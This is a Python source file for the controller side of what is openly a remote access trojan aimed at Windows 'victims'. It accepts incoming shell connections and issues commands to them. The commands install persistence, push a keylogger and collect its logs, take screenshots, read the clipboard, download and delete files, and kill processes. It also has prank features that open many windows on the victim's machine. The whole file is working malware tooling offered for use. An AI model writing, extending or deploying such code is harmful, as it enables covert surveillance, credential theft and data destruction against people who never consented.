import threading
import socket as s
from time import sleep
from random import randint

# constant ports:
# by default your localport(change if neaded):
HOST = s.gethostbyname(s.gethostname())
# change port to your need:
PORT = 420
# -------------don't change anything from here if you don't know what you are doing-------------
BUFFER = 4096
ADDR = (HOST, PORT)
FORMAT = "cp850"
DISCONNECT = "!dsc"

server = s.socket(s.AF_INET, s.SOCK_STREAM)
server.bind(ADDR)
# saves active sessions
sessions = {}
session_ids = []

# saves all the command
COMMANDS = ["help", "sessions"]
SESSION_COMMANDS = ["help", "back", "tree", "install", "matrix", "disconnect", "ps", "kill", "keylogger", "getlogs",
                    "keybind", "msg", "statlights", "delete", "uninstall", "ls", "whoami", "clipboard", "download",
                    "error", "screenshot"]


class Commands:
    def __init__(self):
        # the help message
        self.helpmsg = """
        All sessions scripts with a "(p)" at the end need the shell to be installed the ones with the "(t)" can be used without installation
        menu Commands:
        help: shows this message
        back: gets deselects the session and gets you back to them main menu
        sessions: [-s {sesion id} session id to sellect a session] [-d {sesion id} to dellete a session]
        
        session Commands|:
        disconnect: Disconnects from the selected shell
        misc:
            tree: Shows the entire dirrectorystructure of the 'C:\\' drive
            install: Makes the shell persistent(starts with the victims computer)
        troll:
            matrix: [{number} how many times a cmd window will open] opens a big cmd window with random numbers generating(t)
        """

    # commands in the main menu
    def mainMenu(self, command, args=None):
        if command == "help":
            print(self.helpmsg)
        elif command == "sessions":
            # checks for arguments
            if not args:
                if len(sessions) == 0:
                    print("there are no active sessions")

                else:
                    # gets all the sessions to print them
                    for i in sessions.items():
                        print(f"id: {i[1]['id']}   name: {i[1]['name']}")
            # checks if there are to meny arguments
            elif len(args) > 2:
                print("too many arguments only one is allowed")
            # the select argument to select a session
            elif args[0] == "-s" and len(args) == 2:
                if args[1] in session_ids:
                    sessionId = args[1]
                    sessionInfo = sessions[sessionId]
                    # gets the connection info
                    connectionInfo = sessionInfo["connection"]
                    # changes to session menu
                    print(f"changed to {sessionInfo['name']}")
                    sessionInput(connectionInfo[0], connectionInfo[1], sessionInfo["name"], sessionId)

                else:
                    print("This id is not availible")
            # to dellete a session
            elif args[0] == "-d" and len(args) == 2:
                if args[1] in session_ids:
                    sessionInfo = sessions[args[1]]

                    # confirm if you really dellete the session
                    def confirmation():
                        confirm = input(f"are you sure you want to dellete {sessionInfo['name']}[y|n]")
                        if confirm == "y":
                            sessions.pop(args[1])
                            session_ids.remove(args[1])
                            print(f"delleted {sessionInfo['name']}")
                        elif confirm == "n":
                            mainMenu()
                        else:
                            print("This is not a valid option")
                            confirmation()

                    confirmation()
            else:
                print("you need a  value after your argument!")

    # for commands if a session is sellected
    def session(self, name, conn, addr, message, decId, args=None):
        decId = str(decId)

        # delets the session and all its inforamtion
        def delete():
            sessions.pop(decId)
            session_ids.remove(decId)
            mainMenu()

        # reveives the messages and passes them to the evaluation
        def receiveMessage():
            msg_length = conn.recv(BUFFER).decode(FORMAT)

            if msg_length:
                msg_length = int(msg_length)
                decodetMsg = conn.recv(msg_length).decode(FORMAT)
                return decodetMsg

        # sends the message
        def sendMessage(msg, recv=False):
            # sends the message length
            message_length = str(len(msg)).encode(FORMAT)
            message_length += b" " * (BUFFER - len(message_length))
            # sends the buffered message length
            conn.send(message_length)
            # sends the message
            conn.send(msg.encode(FORMAT))
            # checks if the sended command wants an input
            if msg[2] == "o" or recv:
                returned = receiveMessage()
                return returned
            else:
                return

        # gets you back to the main menu
        if message == "back":
            mainMenu()

        # prints the help message
        elif message == "help":
            print(self.helpmsg)

        # shows the entire dir tree
        elif message == "tree":
            print(sendMessage("c o tree C:\\"))

        # installs the shell persistently
        elif message == "install":
            with open("extraScripts/plain.py", "r") as file:
                sendMessage(f"x{file.read()}")

        # is a small bat script which makes random number appear in a cmd screen
        elif message == "matrix":
            if args:
                try:
                    arg = int(args[0])
                except ValueError:
                    print("The argument needs to be a number")
                # gets the username of the computer
                username = sendMessage("c o echo %USERNAME%").replace("\n", "")
                # sends the matrix.bat script
                with open("extraScripts/matrix.bat", "r") as file:
                    sendMessage(file.read())
                name = receiveMessage()
                # opens the cmd window args[0] times on the pc
                for i in range(int(args[0])):
                    sendMessage(f"c n start cmd /c C:\\Users\\{username}\\AppData\\Local\\Temp\\{name}")
                    sleep(0.1)

            elif not args:
                print("you need an argument type 'help' for more")
            else:
                print("Those are too many arguments only one is allowed type 'help' for more.")
        # shows all tasks with pid
        elif message == "ps":
            print(sendMessage("c o tasklist"))
        # kills task with given pid
        elif message == "kill":
            # taskkill /im
            if args:
                try:
                    args = int(args[0])
                except ValueError:
                    print("you need to enter a pid(number)")
                sendMessage(f"c x taskkill /im {args}")
            elif not args:
                print("You need arguments type 'help' for more.")
            else:
                print("Those are too many arguments only one is allowed type 'help' for more.")
        # installs a keylogger on the pc
        elif message == "keylogger":
            with open("extraScripts/keylogger.py", "r") as file:
                sendMessage(file.read())
            if receiveMessage() == "err":
                print("You need to install the shell")
        # gets the keylogger logs
        elif message == "getlogs":
            sendMessage("r C:/$SysStartup/temp/logs.txt")
            exists = receiveMessage()
            if exists != "err":
                with open("downloadedLogs.txt", "a") as file:
                    file.write(str(exists))
            else:
                print("Either wait for a logfile or install the keylogger.")
        # deletes a file in given path
        elif message == "delete":
            if args:
                message = f"{args[0]}".replace("/", "\\")
                sendMessage(f"c n del /f /Q {message}")
            elif not args:
                print("You need a path type 'help' for more")
            else:
                print("to many arguments type 'help' for more")

        # uninstalls the whole shell
        elif message == "uninstall":
            user = sendMessage("c o echo %USERNAME%").replace("\n", "")
            with open("extraScripts/uninstall.bat", "r") as file:
                sendMessage(file.read())
            name = receiveMessage()
            sendMessage(f"c n C:\\Users\\{user}\\AppData\\Local\\Temp\\{name}")
            sendMessage("!dsc")
            conn.close()
            delete()

        # sends a keybind
        elif message == "keybind":
            special_keys = {"ctrl": "Key.ctrl", "windows": "Key.cmd", "alt": "Key.alt_l", "alt_gr": "Key.alt_gr",
                            "back": "Key.backspace",
                            "caps": "Key.caps_lock", "num": "Key.num_lock", "shift": "Key.shift", "esc": "Key.esc",
                            "enter": "Key.enter",
                            "del": "Key.delete", "insert": "Key.insert", "tab": "Key.tab",
                            "volDown": "Key.media_volume_down", "volUp": "Key.media_volume_up"}
            # checks for arguments
            if args:
                keysStr = args[0]
                rawKeyLst = keysStr.split("+")
                keyLst = []
                # converts all keys into the key classes
                for key in rawKeyLst:
                    if len(key) == 1:
                        keyLst.append(key)
                    else:
                        if key in special_keys:
                            keyLst.append(special_keys[key])
                        else:
                            print(f"{key}, is not a valid key, check the readme file for all the keys")

                sendMessage(f"k b {' '.join(keyLst)}")
            elif not args:
                print("You need to type the keybinds type 'help' for more.")
            else:
                print("Those are to many arguments type 'help' for more.")
        # types a message into notepad
        elif message == "msg":
            if args:
                msg = " ".join(args)
                print(msg)
                sendMessage("c n notepad.exe")
                sleep(0.5)
                sendMessage(f"k t {msg}")
            else:
                print("You need atleast one letter for the message type 'help' for more")
        # makes the keyboard status lights blink randomly
        elif message == "statlights":
            if args:
                keys = ["Key.caps_lock", "Key.num_lock", "Key.scroll_lock"]
                for i in range(0, int(args[0])):
                    key = randint(0, 2)
                    sendMessage(f"k s {keys[key]}")
                    sleep(0.2)
            elif not args:
                print("You need to write how many times to let the lights blink type 'help' for more")
            else:
                print("Too many arguments type 'help' for more")

        # shows the contents of a folder
        elif message == "ls":
            if args:
                path = " ".join(args).replace("/", "\\")
                print(sendMessage(f'c o dir "{path}"'))

            elif not args:
                print("You need specify a path type 'help' for more")
        # basic whoami command
        elif message == "whoami":
            print(sendMessage("c o whoami"))

        # shows whats currently in the clipboard
        elif message == "clipboard":
            print(sendMessage("c o powershell Get-Clipboard"))
        # downloads a file from given path
        elif message == "download":
            if args:
                path = " ".join(args).replace("\\", "/")
                ending = path[path.rfind("."):]
                drive = path[0].upper()
                path = path[1:]
                path = drive + path
                sendMessage(f'r {path}')
                download = conn.recv(2048)
                name = f"download{randint(0, 1000)}"
                if download == b"err":
                    print("Path could not be found")
                else:
                    while download:
                        if download[-4:] != b"done":
                            with open(f"{name}{ending}", "ab") as file:
                                file.write(download)
                            download = conn.recv(2048)
                        else:
                            return
            elif not args:
                print("You need to specify a path")
            else:
                print("Too many argument type 'help' for more")
        # open many error messages
        elif message == "error":
            if args:
                # checks if argument is a number
                try:
                    t = int(args[0])
                except ValueError:
                    print("you need to input a number type 'help' for more")
                username = sendMessage("c o echo %USERNAME%").replace("\n", "")
                with open("extraScripts/errorbox.vbs", "r") as file:
                    sendMessage(file.read())
                name = receiveMessage()

                for i in range(int(args[0])):
                    print(name, username)
                    sendMessage(f'c n C:\\Users\\{username}\\AppData\\Local\\Temp\\{name}')

            elif not args:
                print("you need to specify the quantity of windows type 'help' for more")
            else:
                print("too many arguments type 'help' for more")
        # takes a screenshot
        elif message == "screenshot":
            usersName = str(sendMessage("c o echo %USERNAME%").replace("\n", ""))
            with open("extraScripts/screen.py", "r") as file:
                sendMessage(file.read())
            name = receiveMessage()
            sendMessage(f"c n python C:\\Users\\{usersName}\\AppData\\Local\\Temp\\{name}")
            # waits for file creation
            sleep(1)
            # request file
            sendMessage(f"r C:\\Users\\Public\\monitor-1.png")
            pic = conn.recv(2048)
            name = f"screenshot{randint(0, 1000)}.png"
            while pic:
                print(pic)
                if pic[-4:] != b"done":
                    with open(f"{name}", "ab") as file:
                        file.write(pic)
                    pic = conn.recv(2048)
                else:
                    return

                    # disconnects and closes the shell script on the victims pc(if installed it will reconnect after restart of the victims pc)
        elif message == "disconnect":
            sendMessage("!dsc")
            conn.close()
            delete()


# gets the commands whenn session is sellected
def sessionInput(conn, addr, name, decId):
    """
    This is the menu when a session is sellected
    :param conn: class of the connected clinet
    :param addr: information like ip and connection id
    :param name: name of the session
    :param decId: the id of the session in the list
    """
    decId = str(decId)
    # checks if to shell is still connected
    try:
        command = input(f"command({name}): ")
        commandLst = command.split(" ")
        # checks if the input is in the session commands
        if commandLst[0] in SESSION_COMMANDS:
            scom = Commands()
            if len(commandLst) > 1:
                scom.session(name, conn, addr, commandLst[0], decId, commandLst[1:len(commandLst)])
            else:
                scom.session(name, conn, addr, commandLst[0], decId)
            sessionInput(conn, addr, name, decId)

        elif commandLst[0] in COMMANDS:
            print(f"{command} is only availible in the main menu!")
            sessionInput(conn, addr, name, decId)

        else:
            sessionInput(conn, addr, name, decId)
    except (ConnectionResetError, ConnectionAbortedError):
        sessions.pop(decId)
        session_ids.remove(decId)
        print("The client is no longer connected")
        mainMenu()


# to acces everything not related to a session
def mainMenu():
    command = input("Command:")

    # splits the command to filter out extra options
    commandLst = command.split(" ")

    # checks if the command exist
    if commandLst[0] in COMMANDS:
        com = Commands()
        # checks if there are arguments
        if len(commandLst) > 1:
            com.mainMenu(commandLst[0], commandLst[1:len(commandLst)])
        else:
            com.mainMenu(commandLst[0])
        mainMenu()

    elif commandLst[0] in SESSION_COMMANDS:
        print(f"{command} is only availible if you have a session sellected!")
        mainMenu()

    else:
        print(f"'{command}' is not a known command use 'help' for more!")
        mainMenu()


# starts the listening for a connection ip and port can be changed on top of the script
def startListening():
    server.listen()
    while True:
        conn, addr = server.accept()
        id_num = len(sessions)
        sessions.update({str(id_num): {"id": f"{id_num}", "name": f"session{id_num}", "connection": (conn, addr),
                                       "pyinstall": False}})
        session_ids.append(str(id_num))
        print(f"[CONNECTION] New connection from {addr[0]}")
        startListening()


listening = threading.Thread(target=startListening)
menues = threading.Thread(target=mainMenu)

listening.start()
print(f"[SERVER] Server starten and now listening on {HOST}:{PORT}\n")
menues.start()
